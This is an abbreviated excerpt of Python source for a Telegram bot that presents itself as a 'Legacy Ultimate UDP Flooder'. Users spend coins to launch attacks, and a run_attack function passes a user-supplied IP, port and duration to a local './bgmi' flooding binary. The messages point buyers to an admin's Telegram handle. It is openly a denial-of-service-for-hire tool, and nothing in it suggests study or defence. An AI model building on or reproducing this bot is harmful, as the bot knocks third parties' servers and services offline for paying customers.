...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*🎉 Welcome to the Legacy Ultimate UDP Flooder! 🎉*\n\n"
...
async def attack(update: Update, context: CallbackContext):
    ...
    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Insufficient coins! Please contact the admin to acquire more coins. DM: @LEGACY4REAL0*",
            parse_mode='Markdown'
        )
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./bgmi {ip} {port} {duration} {350} {800}"
...
async def help(update: Update, context: CallbackContext):
    ...
    message = (
        ...
        "- *If you encounter any issues, contact the admin: @LEGACY4REAL0*\n\n"
